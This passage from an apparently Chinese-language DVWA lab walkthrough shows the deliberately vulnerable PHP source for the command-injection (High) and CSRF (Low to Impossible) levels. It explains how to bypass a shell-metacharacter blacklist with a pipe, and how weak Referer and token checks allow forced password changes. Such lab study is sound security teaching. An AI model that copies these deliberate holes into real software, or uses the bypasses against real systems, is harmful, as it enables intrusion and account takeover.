	<span class="token variable">$target</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'ip'</span> <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Set blacklist</span>
	<span class="token variable">$substitutions</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
		<span class="token string single-quoted-string">'&amp;'</span>  <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
		<span class="token string single-quoted-string">';'</span>  <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
		<span class="token string single-quoted-string">'| '</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
		<span class="token string single-quoted-string">'-'</span>  <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
		<span class="token string single-quoted-string">'$'</span>  <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
		<span class="token string single-quoted-string">'('</span>  <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
		<span class="token string single-quoted-string">')'</span>  <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
		<span class="token string single-quoted-string">'`'</span>  <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
		<span class="token string single-quoted-string">'||'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
	<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Remove any of the characters in the array (blacklist).</span>
	<span class="token variable">$target</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span> <span class="token function">array_keys</span><span class="token punctuation">(</span> <span class="token variable">$substitutions</span> <span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$substitutions</span><span class="token punctuation">,</span> <span class="token variable">$target</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Determine OS and execute the ping command.</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">stristr</span><span class="token punctuation">(</span> <span class="token function">php_uname</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'s'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'Windows NT'</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		<span class="token comment">// Windows</span>
		<span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'ping  '</span> <span class="token operator">.</span> <span class="token variable">$target</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
		<span class="token comment">// *nix</span>
		<span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'ping  -c 4 '</span> <span class="token operator">.</span> <span class="token variable">$target</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// Feedback for the end user</span>
	<span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"&lt;pre&gt;<span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$cmd</span><span class="token punctuation">}</span></span>&lt;/pre&gt;"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token operator">?</span><span class="token operator">&gt;</span>

</code></pre> 
<blockquote> 
 <p>又是黑名单，过滤了很多拼接字符，但是注意第三个|后面多了个空格，我们使用|| 就会导致| 先被匹配了，|| 就换变成| ，后面就匹配不成功了，依旧可以导致命令执行。</p> 
</blockquote> 
<p><img src="https://images2.imgbox.com/61/8d/fMumtPkC_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/b6/f9/L8tqgg8F_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="CSRF_394"></a>三、CSRF</h2> 
<h3><a id="1Low_395"></a>1、Low</h3> 
<p>源码：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'Change'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	<span class="token comment">// Get input</span>
	<span class="token variable">$pass_new</span>  <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'password_new'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token variable">$pass_conf</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'password_conf'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>

	<span class="token comment">// Do the passwords match?</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$pass_new</span> <span class="token operator">==</span> <span class="token variable">$pass_conf</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		<span class="token comment">// They do!</span>
		<span class="token variable">$pass_new</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$pass_new</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string double-quoted-string">""</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$pass_new</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span> <span class="token variable">$pass_new</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token comment">// Update the database</span>
		<span class="token variable">$insert</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"UPDATE `users` SET password = '<span class="token interpolation"><span class="token variable">$pass_new</span></span>' WHERE user = '"</span> <span class="token operator">.</span> <span class="token function">dvwaCurrentUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"';"</span><span class="token punctuation">;</span>
		<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$insert</span> <span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'&lt;pre&gt;'</span> <span class="token operator">.</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$___mysqli_res</span> <span class="token punctuation">:</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/pre&gt;'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token comment">// Feedback for the user</span>
		<span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
		<span class="token comment">// Issue with passwords matching</span>
		<span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token constant boolean">false</span> <span class="token punctuation">:</span> <span class="token variable">$___mysqli_res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token operator">?</span><span class="token operator">&gt;</span>

</code></pre> 
<blockquote> 
 <p>主要是更改密码的操作，但是源码中并没有做任何检测，因此，假如一个人开启了网站没有关闭，诱导点击链接，可以达到更改密码的效果。<br> <img src="https://images2.imgbox.com/ce/19/mvKafGEb_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/95/bf/8vC6Aqcx_o.png" alt="在这里插入图片描述"></p> 
</blockquote> 
<h3><a id="2Medium_434"></a>2、Medium</h3> 
<p>源码：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'Change'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	<span class="token comment">// Checks to see where the request came from</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">stripos</span><span class="token punctuation">(</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'HTTP_REFERER'</span> <span class="token punctuation">]</span> <span class="token punctuation">,</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'SERVER_NAME'</span> <span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		<span class="token comment">// Get input</span>
		<span class="token variable">$pass_new</span>  <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'password_new'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token variable">$pass_conf</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'password_conf'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>

		<span class="token comment">// Do the passwords match?</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$pass_new</span> <span class="token operator">==</span> <span class="token variable">$pass_conf</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
			<span class="token comment">// They do!</span>
			<span class="token variable">$pass_new</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$pass_new</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string double-quoted-string">""</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token variable">$pass_new</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span> <span class="token variable">$pass_new</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

			<span class="token comment">// Update the database</span>
			<span class="token variable">$insert</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"UPDATE `users` SET password = '<span class="token interpolation"><span class="token variable">$pass_new</span></span>' WHERE user = '"</span> <span class="token operator">.</span> <span class="token function">dvwaCurrentUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"';"</span><span class="token punctuation">;</span>
			<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$insert</span> <span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'&lt;pre&gt;'</span> <span class="token operator">.</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$___mysqli_res</span> <span class="token punctuation">:</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/pre&gt;'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

			<span class="token comment">// Feedback for the user</span>
			<span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
			<span class="token comment">// Issue with passwords matching</span>
			<span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
		<span class="token comment">// Didn't come from a trusted source</span>
		<span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"&lt;pre&gt;That request didn't look correct.&lt;/pre&gt;"</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token constant boolean">false</span> <span class="token punctuation">:</span> <span class="token variable">$___mysqli_res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token operator">?</span><span class="token operator">&gt;</span>

</code></pre> 
<blockquote> 
 <p>相比于Low，这里增加了一个if的判断，判断数据包中Referer的值是否出现主机名即IP地址</p> 
</blockquote> 
<h3><a id="3High_479"></a>3、High</h3> 
<p>源码：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token variable">$change</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
<span class="token variable">$request_type</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"html"</span><span class="token punctuation">;</span>
<span class="token variable">$return_message</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Request Failed"</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"POST"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">array_key_exists</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"CONTENT_TYPE"</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CONTENT_TYPE'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"application/json"</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$request_type</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"json"</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"HTTP_USER_TOKEN"</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
		<span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"password_new"</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
		<span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"password_conf"</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
		<span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Change"</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		<span class="token variable">$token</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_USER_TOKEN'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token variable">$pass_new</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"password_new"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token variable">$pass_conf</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"password_conf"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token variable">$change</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"user_token"</span><span class="token punctuation">,</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
		<span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"password_new"</span><span class="token punctuation">,</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
		<span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"password_conf"</span><span class="token punctuation">,</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
		<span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Change"</span><span class="token punctuation">,</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		<span class="token variable">$token</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"user_token"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token variable">$pass_new</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"password_new"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token variable">$pass_conf</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"password_conf"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token variable">$change</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$change</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	<span class="token comment">// Check Anti-CSRF token</span>
	<span class="token function">checkToken</span><span class="token punctuation">(</span> <span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'session_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'index.php'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Do the passwords match?</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$pass_new</span> <span class="token operator">==</span> <span class="token variable">$pass_conf</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		<span class="token comment">// They do!</span>
		<span class="token variable">$pass_new</span> <span class="token operator">=</span> <span class="token function">mysqli_real_escape_string</span> <span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$pass_new</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$pass_new</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span> <span class="token variable">$pass_new</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token comment">// Update the database</span>
		<span class="token variable">$insert</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"UPDATE `users` SET password = '"</span> <span class="token operator">.</span> <span class="token variable">$pass_new</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"' WHERE user = '"</span> <span class="token operator">.</span> <span class="token function">dvwaCurrentUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"';"</span><span class="token punctuation">;</span>
		<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$insert</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token comment">// Feedback for the user</span>
		<span class="token variable">$return_message</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Password Changed."</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
		<span class="token comment">// Issue with passwords matching</span>
		<span class="token variable">$return_message</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Passwords did not match."</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$request_type</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"json"</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		<span class="token function">generateSessionToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">header</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type: application/json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">print</span> <span class="token function">json_encode</span> <span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Message"</span> <span class="token operator">=&gt;</span><span class="token variable">$return_message</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">exit</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
		<span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"&lt;pre&gt;"</span> <span class="token operator">.</span> <span class="token variable">$return_message</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;/pre&gt;"</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">// Generate Anti-CSRF token</span>
<span class="token function">generateSessionToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token operator">?</span><span class="token operator">&gt;</span>

</code></pre> 
<blockquote> 
 <p>很明显，High增加了对token的判断，需要用户客户端的token才能进行修改，需要联合其它漏洞事先获取到用户的token。</p> 
</blockquote> 
<h3><a id="4Impossible_556"></a>4、Impossible</h3> 
<p>源码：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'Change'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	<span class="token comment">// Check Anti-CSRF token</span>
	<span class="token function">checkToken</span><span class="token punctuation">(</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'user_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'session_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'index.php'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Get input</span>
	<span class="token variable">$pass_curr</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'password_current'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token variable">$pass_new</span>  <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'password_new'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
